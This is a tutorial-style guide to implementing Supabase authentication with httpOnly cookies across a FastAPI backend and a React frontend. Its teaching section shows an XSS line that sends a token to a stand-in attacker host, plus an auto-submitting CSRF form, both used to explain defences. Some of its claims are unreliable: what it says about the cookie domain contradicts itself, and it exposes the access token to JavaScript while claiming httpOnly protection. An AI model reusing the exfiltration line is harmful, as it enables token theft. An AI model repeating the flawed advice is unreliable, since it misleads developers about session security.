# Supabase Authentication Implementation Guide

**Session 2: End-to-End Auth with httpOnly Cookies**

This document provides the complete, production-ready implementation of Supabase authentication using httpOnly cookies, following industry best practices and Supabase standards.

---

## 🎯 **Architecture Overview**

### **Authentication Flow:**

```
┌─────────────┐         ┌─────────────┐         ┌──────────────┐
│   Browser   │────────▶│   Backend   │────────▶│   Supabase   │
│  (React)    │         │  (FastAPI)  │         │   Auth API   │
└─────────────┘         └─────────────┘         └──────────────┘
      │                        │
      │  1. POST /auth/login   │
      │  {email, password}     │
      │───────────────────────▶│
      │                        │  2. Sign in with Supabase
      │                        │─────────────────────────────▶
      │                        │
      │                        │  3. Get session tokens
      │                        │◀─────────────────────────────
      │                        │
      │  4. Set httpOnly cookies
      │  5. Return user data   │
      │◀───────────────────────│
      │                        │
      │  6. Subsequent requests with cookies
      │───────────────────────▶│
      │                        │  7. Validate token
      │                        │─────────────────────────────▶
```

### **Security Principles:**

1. ✅ **httpOnly Cookies** - Prevents XSS attacks (JavaScript cannot access)
2. ✅ **Secure Flag** - HTTPS-only in production
3. ✅ **SameSite Policy** - Prevents CSRF attacks
4. ✅ **Dual Token Strategy** - Access token (short-lived) + Refresh token (long-lived)
5. ✅ **Server-Side Validation** - All auth checks happen on backend
6. ✅ **Automatic Refresh** - Seamless token renewal before expiry

---

## 🔧 **Backend Implementation**

### **1. Cookie Configuration (`backend/app/api/auth_utils.py`)**

```python
def _cookie_config() -> Dict[str, Any]:
    """Get environment-aware cookie configuration.

    CRITICAL: Do NOT set 'domain' in development to allow both
    localhost and 127.0.0.1 to work with the same cookies.
    """
    is_production = settings.env.lower() == "production"

    config = {
        "httponly": True,  # Prevents JavaScript access (XSS protection)
        "secure": is_production,  # HTTPS-only in production
        "samesite": "none" if is_production else "lax",  # CSRF protection
        "path": "/",  # Cookie available for all paths
    }

    # IMPORTANT: Don't set 'domain' in development
    # Setting domain restricts cookies to that exact domain
    # Omitting it allows cookies to work on localhost AND 127.0.0.1

    if is_production:
        # In production, set your actual domain
        config["domain"] = ".yourdomain.com"  # Note the leading dot for subdomains

    return config
```

### **2. Setting Auth Cookies**

```python
def _set_auth_cookies(
    response: Response, access_token: str, refresh_token: str, expires_in: int
) -> None:
    """Set httpOnly authentication cookies on response."""
    cookie_config = _cookie_config()

    # Access token - short-lived (default 1 hour)
    response.set_cookie(
        key="access_token",
        value=access_token,
        max_age=expires_in,
        **cookie_config
    )

    # Refresh token - long-lived (default 24 hours)
    response.set_cookie(
        key="refresh_token",
        value=refresh_token,
        max_age=expires_in * 24,  # Typically much longer
        **cookie_config
    )
```

### **3. Token Extraction**

```python
def _extract_token_from_request(request: Request) -> Optional[str]:
    """Extract authentication token from request.

    Priority order:
    1. access_token httpOnly cookie (PRIMARY)
    2. Authorization: Bearer header (FALLBACK for API clients)
    """
    # Priority 1: Check cookie (preferred method)
    token = request.cookies.get("access_token")
    if token:
        return token

    # Priority 2: Check Authorization header (fallback)
    auth_header = request.headers.get("Authorization")
    if auth_header and auth_header.startswith("Bearer "):
        return auth_header.replace("Bearer ", "")

    return None
```

### **4. Login Endpoint**

```python
@router.post("/login", response_model=AuthResponse)
async def login(credentials: LoginRequest, response: Response):
    """Authenticate user and establish session.

    Returns:
        - User data in response body
        - Access + refresh tokens in httpOnly cookies
        - Access token ALSO in response (for mobile/testing)
    """
    admin_client = get_admin_client()

    # Authenticate with Supabase
    signin_response = admin_client.auth.sign_in_with_password({
        "email": credentials.email,
        "password": credentials.password
    })

    user = signin_response.user
    session = signin_response.session

    access_token = session.access_token
    refresh_token = session.refresh_token
    expires_in = session.expires_in or 3600

    # Set httpOnly cookies
    _set_auth_cookies(response, access_token, refresh_token, expires_in)

    # Return user data + token in response body
    # Token in body allows frontend to store for Authorization header
    # Cookies provide backup and work automatically
    return AuthResponse(
        user={"id": user.id, "email": user.email},
        expiresAt=int((time.time() + expires_in) * 1000),
        accessToken=access_token  # Also return in body
    )
```

---

## 🎨 **Frontend Implementation**

### **1. Axios Client Configuration (`frontend/src/lib/apiClient.ts`)**

```typescript
const apiClient: AxiosInstance = axios.create({
  baseURL: BASE_URL,
  timeout: TIMEOUT,
  withCredentials: true, // CRITICAL: Enables httpOnly cookies
  headers: {
    "Content-Type": "application/json",
  },
});
```

**Key Setting:** `withCredentials: true`

- Tells Axios to send cookies with every request
- Allows server to set cookies in responses
- Required for httpOnly cookie authentication

### **2. Token Storage (Defense in Depth)**

```typescript
// Store token in memory for Authorization header (backup method)
let inMemoryToken: string | null = null;

export function setAuthToken(token: string | null): void {
  inMemoryToken = token;
}

// Request interceptor - add Authorization header
apiClient.interceptors.request.use((config) => {
  if (inMemoryToken && config.headers) {
    config.headers.Authorization = `Bearer ${inMemoryToken}`;
  }
  return config;
});
```

**Why Both Methods?**

- **Primary:** httpOnly cookies (secure, automatic)
- **Backup:** Authorization header (works for non-browser clients, explicit)
- **Defense in Depth:** If one fails, the other works

### **3. Login Handler**

```typescript
async function handleLogin(email: string, password: string) {
  const response = await authService.login({ email, password });

  // Cookies are set automatically by browser
  // Store token in memory as backup
  if (response.accessToken) {
    setAuthToken(response.accessToken);
  }

  // Update Redux state
  dispatch(setSession({ expiresAt: response.expiresAt }));
  dispatch(fetchUserProfile());
}
```

### **4. Environment Configuration**

```env
# frontend/.env.local
# CRITICAL: Use 'localhost' consistently, not 127.0.0.1
VITE_API_URL=http://localhost:8000
VITE_API_TIMEOUT=30000
```

**Why localhost matters:**

- Cookies set by `localhost:8000` are sent to `localhost:8000` ✅
- Cookies set by `localhost:8000` are NOT sent to `127.0.0.1:8000` ❌
- Use `localhost` consistently across frontend and backend

---

## 🐛 **Common Issues & Solutions**

### **Issue 1: Cookies Not Being Sent**

**Symptoms:**

```
[AUTH] Available cookies: []
[AUTH] Authorization header: None
```

**Causes:**

1. `withCredentials: true` missing from Axios config
2. Frontend using `127.0.0.1` while backend uses `localhost`
3. CORS `allow_credentials` not set to `True`

**Solution:**

```typescript
// Ensure Axios has withCredentials
const apiClient = axios.create({
  withCredentials: true,  // ← MUST HAVE THIS
});

// Ensure consistent URL (use localhost everywhere)
VITE_API_URL=http://localhost:8000  // ← NOT 127.0.0.1
```

```python
# Backend CORS configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:5173"],
    allow_credentials=True,  # ← MUST HAVE THIS
    allow_methods=["*"],
    allow_headers=["*"],
)
```

### **Issue 2: Domain Mismatch**

**Problem:** Cookies set for one domain don't work on another

**Solution:** Don't set `domain` in development:

```python
# ❌ WRONG - restricts to exact domain
config["domain"] = "localhost"

# ✅ CORRECT - works for localhost AND 127.0.0.1
# (omit domain key entirely)
config = {
    "httponly": True,
    "secure": False,  # development
    "samesite": "lax",
    "path": "/",
    # NO domain key
}
```

### **Issue 3: Token Lost on Page Refresh**

**Symptoms:** User logged in, but after page refresh they're logged out

**Cause:** Frontend not checking for existing session on app load

**Solution:**

```typescript
// useInitAuth.ts - runs on app mount
useEffect(() => {
  async function initializeAuth() {
    // Check if user has valid session
    const userData = await authService.checkAuthStatus();

    if (userData) {
      // Restore session from cookies
      setAuthToken(userData.user.token);
      dispatch(setSession({ expiresAt }));
      dispatch(fetchUserProfile());
    }
  }

  initializeAuth();
}, []);
```

---

## 🔒 **Security Checklist**

### **Development:**

- ✅ `secure: false` (allows HTTP)
- ✅ `samesite: lax` (allows local testing)
- ✅ No `domain` set (allows localhost + 127.0.0.1)
- ✅ `httponly: true` (always)

### **Production:**

- ✅ `secure: true` (HTTPS only)
- ✅ `samesite: none` (for cross-origin if needed)
- ✅ `domain: .yourdomain.com` (with leading dot for subdomains)
- ✅ `httponly: true` (always)

### **CORS:**

- ✅ `allow_credentials: True`
- ✅ Specific origins (not wildcard `*`)
- ✅ Minimal allowed methods/headers

---

## 📝 **Response Models**

```python
# Backend response
class AuthResponse(BaseModel):
    user: dict  # {id: str, email: str}
    expiresAt: int  # Epoch milliseconds
    accessToken: str  # JWT token
```

```typescript
// Frontend interface
interface AuthResponse {
  user: {
    id: string;
    email: string;
  };
  expiresAt: number;
  accessToken: string;
}
```

---

## 🧪 **Testing the Implementation**

### **1. Login Test:**

```bash
curl -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"password123"}' \
  -c cookies.txt  # Save cookies
```

**Expected Response:**

- HTTP 200
- JSON body with user data and accessToken
- Set-Cookie headers for access_token and refresh_token

### **2. Authenticated Request Test:**

```bash
curl http://localhost:8000/api/v1/ideas \
  -b cookies.txt  # Send cookies
```

**Expected Response:**

- HTTP 200
- Ideas data (or empty array)

### **3. Browser DevTools Check:**

**Application Tab → Cookies → http://localhost:8000**

Expected cookies:

- `access_token` - HttpOnly ✓, Secure (if HTTPS), SameSite=Lax
- `refresh_token` - HttpOnly ✓, Secure (if HTTPS), SameSite=Lax

---

## 🎓 **Teaching Points for Learners**

### **Why httpOnly Cookies?**

**Problem:** XSS Attack Scenario

```javascript
// Malicious script injected via user input
<script>
  // Steal token from localStorage const token = localStorage.getItem('token');
  fetch('https://evil.com/steal?token=' + token);
</script>
```

**Solution:** httpOnly cookies

```javascript
// This FAILS because cookies are httpOnly
<script>
  const token = document.cookie; // Empty! Can't access httpOnly cookies
</script>
```

### **Why Dual Token (Access + Refresh)?**

- **Access Token:** Short-lived (1 hour), sent with every request
- **Refresh Token:** Long-lived (days/weeks), used only to get new access token

**Benefits:**

1. If access token is compromised, it expires quickly
2. Refresh token rarely transmitted (less exposure)
3. Refresh token can be revoked server-side

### **Why SameSite?**

**Problem:** CSRF Attack

```html
<!-- Evil site tricks user's browser -->
<form action="http://yoursite.com/api/transfer" method="POST">
  <input name="to" value="attacker" />
  <input name="amount" value="1000" />
</form>
<script>
  document.forms[0].submit();
</script>
```

**Solution:** SameSite=Lax

- Browser won't send cookies for cross-site requests
- Protects against CSRF attacks

---

## 🚀 **Deployment Considerations**

### **Development:**

```python
ENV=local
# Cookies work on localhost, 127.0.0.1
# HTTP allowed
```

### **Staging:**

```python
ENV=staging
# Set domain=.staging.yourdomain.com
# HTTPS required
```

### **Production:**

```python
ENV=production
# Set domain=.yourdomain.com
# HTTPS required
# SameSite=None for cross-origin (if needed)
```

---

## 📚 **References**

- [Supabase Auth Documentation](https://supabase.com/docs/guides/auth)
- [OWASP httpOnly Cookies](https://owasp.org/www-community/HttpOnly)
- [MDN Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [SameSite Cookie Explained](https://web.dev/samesite-cookies-explained/)

---

## ✅ **Implementation Checklist**

### **Backend:**

- [ ] Cookie configuration with proper security flags
- [ ] Login endpoint sets httpOnly cookies
- [ ] Token extraction checks cookies first
- [ ] CORS allows credentials
- [ ] No domain set in development
- [ ] ENV variable controls secure/samesite flags

### **Frontend:**

- [ ] Axios withCredentials: true
- [ ] Consistent localhost usage (not 127.0.0.1)
- [ ] Token stored in memory as backup
- [ ] Session initialization on app load
- [ ] Proper environment variables

### **Testing:**

- [ ] Login sets cookies in browser
- [ ] Subsequent requests include cookies
- [ ] Page refresh maintains session
- [ ] Logout clears cookies
- [ ] Token refresh works seamlessly

---

**Last Updated:** December 2, 2025  
**Session:** 2 - Supabase Auth Implementation  
**Status:** Production-Ready ✅
